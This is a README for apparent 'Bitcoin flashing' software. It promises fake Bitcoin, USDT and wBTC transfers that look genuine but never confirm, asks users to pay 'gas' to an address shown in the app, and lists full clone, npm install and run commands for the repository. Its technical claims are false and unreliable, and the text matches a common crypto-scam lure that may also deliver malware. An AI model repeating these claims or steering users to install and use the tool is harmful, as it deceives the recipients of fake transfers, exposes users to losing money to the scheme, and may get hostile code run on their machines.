## Description

### What is Bitcoin flashing?

Bitcoin flashing is a practice of sending Bitcoin from one wallet to another in a transaction that will be rendered invalid in the long run. This is achieved either by manipulating the transaction signature, gas fees, or altering the token decimals programatically.

### Bitcoin flashing software

Coin Flasher is an experimental software application that allows Bitcoin flashing with the complete source code included. USDT and Wrapped Bitcoin flashing are also supported. This software application exists solely as a proof-of-concept solution, and should only be used experimentally. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until you study the underlying code or attempt to swap them.

You will have a limited spendable quota of either Bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.

### Bitcoin flashing source code

Bitcoin flashing source code is available for instant download as a zip file through curl on the terminal. Check the project homepage for more details.

## Prerequisites
This application requires [Node.js](https://nodejs.org) to run.

### Android/IOS

Click [here](https://github.com/flashing-software/flash-btc-mobile) to visit the mobile repository.

### Windows

Download the Node.js setup application [here](https://nodejs.org/en/download/).

### Linux

Run this code in terminal. You may need superuser privileges (sudo).

```sh
apt install nodejs
```

### Mac

Install Homebrew (if you don't have it). Open the terminal and run:

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Once Homebrew is installed, you can install Node.js by running:

```sh
brew install node
```

## Installation

1. Clone the repository:

```sh
git clone https://github.com/flashing-software/bitcoin-flashing && cd bitcoin-flashing
```

2. Install necessary dependencies:

```sh
npm install && npm install electron
```

## Usage

```sh
npm start
```
Gas is required for every non-bitcoin (USDT, wBTC) flashing transaction. You are responsible for your gas fees. You'll find corresponding gas addresses for each token type.


https://github.com/user-attachments/assets/5fa2e2cc-e678-4c96-8e75-256a63957bcb


https://github.com/user-attachments/assets/b583771d-9678-4efe-ab1d-a08c52e73757



